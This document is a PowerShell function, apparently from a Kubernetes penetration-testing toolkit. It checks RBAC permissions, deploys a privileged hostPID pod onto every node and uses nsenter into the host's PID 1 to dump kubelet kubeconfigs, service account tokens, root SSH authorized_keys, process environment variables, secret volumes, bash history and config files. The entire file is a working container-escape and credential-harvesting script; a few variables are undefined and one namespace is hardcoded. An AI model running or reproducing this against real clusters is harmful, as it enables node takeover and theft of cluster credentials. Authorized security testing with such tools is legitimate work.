Function Test-ExploitabilityToNode {
    [CmdletBinding(SupportsShouldProcess=$true,ConfirmImpact="High")]
    param(

        [Parameter(Mandatory = $false)]
        [Alias("t")]
        [string]$access_token = "nvt"
    )
    if($PSCmdlet.ShouldProcess("Trying to exploitation to node")){
        Write-Host "Starting to Analyze"

        # Define an array with the actions and resources to check
        $actionResourcePairs = @(
            @{ Action = "create"; Resource = "pods" },
            @{ Action = "get"; Resource = "node/debug" },
            @{ Action = "exec"; Resource = "pods" },
            @{ Action = "get"; Resource = "node" }

        )
        $AllowedNamespaces = Get-NamespaceWhereAllActionsAreAllowed -ActionResourcePairs $actionResourcePairs
        if($AllowedNamespaces){
            Write-Host "It looks like we should be allowed to debug the node"
            Get-SensitiveInformationFromNode
            return;
        } 
        Write-Host "It looks like we aren't able to debug the node directly trying other methods"

        # Define an array with the actions and resources to check
        $actionResourcePairs = @(
            @{ Action = "create"; Resource = "pods" },
            @{ Action = "get"; Resource = "pods/exec" },
            @{ Action = "delete"; Resource = "pods" }
        )
        $AllowedNamespaces = Get-NamespaceWhereAllActionsAreAllowed -ActionResourcePairs $actionResourcePairs
        if (-not $AllowedNamespaces) {
            Write-Host "There isn't a namespace where we can create, execute and delete a pod."
            Write-Host "Do we need to validate without delete statemsent? (this results in that the pod will stay in the system. and you have )"
            Write-Host "No ability to delete the pod. without help from others"
            $yesOrNo = Get-YesOrNoInput
            if(-not $yesOrNo){
                exit;
            }
                    # Define an array with the actions and resources to check
            $actionResourcePairs = @(
                @{ Action = "create"; Resource = "pods" },
                @{ Action = "get"; Resource = "pods/exec" }
            )
            $AllowedNamespaces = Get-NamespaceWhereAllActionsAreAllowed -ActionResourcePairs $actionResourcePairs
            if (-not $AllowedNamespaces) {
                Write-Host "There is still no namespace where we can create and execute a pod."
                return;
                #We could try and find pods we can exec which already have a host mount and privileged, or have hostipc.
            }
        }
        $cleanNamespace = $AllowedNamespaces[0].TrimStart('-')
        Write-Host "Looks like we can execute on a pod and create"
        Write-Host "Trying to retrieve all nodes to force deployment on all nodes"
        $result = kubectl auth can-i get node
        if($result -eq "yes"){
            $nodes = kubectl get nodes -o 'jsonpath={.items[*].metadata.name}' 
            $nodes = $nodes -split " "
            foreach($node in $nodes){
                Write-Host found the following nodes:
                Write-Host $node
                $filePath = "$PSScriptRoot/../../Exploitpods/HostPIDExploitAdminUser.yaml"
                # Read the file, replace the content, and write the changes back
                (Get-Content $filePath) | ForEach-Object {
                    Write-Host $_
                    $_ -replace 'nodeName:.*', "nodeName: $node"
                } | Set-Content $filePath

                Kubectl apply -f $PSScriptRoot/../../Exploitpods/HostPIDExploitAdminUser.yaml -n $cleanNamespace
                #To be sure it is sucesfully running
                Start-Sleep -Seconds 10
                $statusCheck = kubectl get pod priv-and-hostpid-pod -o jsonpath="Status: {.status.phase}" -n $cleanNamespace
            
                if( $statusCheck.Contains("Running")){
                    Write-Host "Retrieving bootstrap-kubeconfig:" -ForegroundColor Green
                    Write-Host ""
                    kubectl exec -it priv-and-hostpid-pod -n $cleanNamespace -- sudo nsenter --target 1 --mount --uts --ipc --net --pid -- cat /var/lib/kubelet/bootstrap-kubeconfig
                    Write-Host ""
                    Write-Host "The node Service account token:" -ForegroundColor Green
                    Write-Host ""
                    kubectl exec -it priv-and-hostpid-pod -n $cleanNamespace-- sudo nsenter --target 1 --mount --uts --ipc --net --pid -- cat /var/run/secrets/kubernetes.io/serviceaccount/token
                    Write-Host ""
                    Write-Host "The ssh authorized keys:" -ForegroundColor Green
                    Write-Host ""
                    kubectl exec -it priv-and-hostpid-pod -n $cleanNamespace -- sudo nsenter --target 1 --mount --uts --ipc --net --pid -- cat /root/.ssh/authorized_keys
                    Write-Host ""
                    Write-Host "Retrieving kubeconfig:" -ForegroundColor Green
                    Write-Host ""
                    kubectl exec -it priv-and-hostpid-pod -n $cleanNamespace -- sudo nsenter --target 1 --mount --uts --ipc --net --pid -- cat /var/lib/kubelet/kubeconfig
                    #Write-Host "some found cache information :"
                    #kubectl debug node/$nodeName -it --image=ubuntu -n $namespace -- cat /host/.kube/cache/http/* not possible
                    Write-Host ""
                    Write-Host "Trying to retrieve all Service Accoun tokens" -ForegroundColor Green
                    kubectl exec -it priv-and-hostpid-pod -n $cleanNamespace -- sudo nsenter --target 1 --mount --uts --ipc --net --pid -- grep -ERi eyj /var/lib/kubelet/pods --include=token
                    Write-Host ""
                    Write-Host "Searching for some custom secrets"
                    kubectl exec -it priv-and-hostpid-pod -n $cleanNamespace -- sudo nsenter --target 1 --mount --uts --ipc --net --pid -- find /var/lib/kubelet/pods/  -type f  -path "*/volumes/kubernetes.io~secret/*"
                    Write-Host ""
                    Write-Host "Searching for short lived access tokens form service accounts (however they do live for more then a year)"
                    Write-Host ""
                    kubectl exec -it priv-and-hostpid-pod -n $cleanNamespace -- sudo nsenter --target 1 --mount --uts --ipc --net --pid -- find /var/lib/kubelet/pods/ -path "*/volumes/kubernetes.io~projected/*/token"

                    #Retrieve environments
                    $procenvironmetLocations = kubectl exec -it priv-and-hostpid-pod -n akv2k8s -- sudo nsenter --target 1 --mount --uts --ipc --net --pid -- find /proc -maxdepth 2 -name environ
                    Write-Host all environments $procenvironmetLocations
                    foreach($environment in $procenvironmetLocations){
                        Write-Host "Listing Environment variables"
                        write-Host $environment
                        kubectl exec -it priv-and-hostpid-pod -n $cleanNamespace -- sudo nsenter --target 1 --mount --uts --ipc --net --pid -- cat $environment
                    }

                    if($extensions.Count -gt 0){
                        Foreach($extension in $extensions){
                            Get-FileExtensionsFromVolumesInNodes -namespace $cleanNamespace -nodeName $nodeName -extension $extension -accesstoken $access_token -method "hostpid"
                        }
                    }
                    else{
                        Write-Host "No extensions where given performing regular search:"
                        Write-Host "Searching for any key file on different volumes"
                        Write-Host ""
                        #Get-FileExtensionsFromVolumesInNodes -namespace $namespace -nodeName $nodeName -extension ".key" -accesstoken $access_token -method "hostpid"
                        Write-Host "Searching for BashHistory"
                        Get-FileExtensionsFromVolumesInNodes -namespace $cleanNamespace -nodeName $nodeName -extension ".bash_history" -accesstoken $access_token -method "hostpid"
                        Write-Host "Searching for configuration files with .conf"
                        Get-FileExtensionsFromVolumesInNodes -namespace $cleanNamespace -nodeName $nodeName -extension ".conf" -accesstoken $access_token -method "hostpid"
                    }
                }
                kubectl delete pod priv-and-hostpid-pod -n $cleanNamespace
            }
        }
        
        else{
            Write-Host "there was an error apperantly the status resulted with $statusCheck"
            Write-Host "Listing more log information below"
            kubectl logs priv-and-hostpid-pod -n $cleanNamespace
        }

 
    }


}
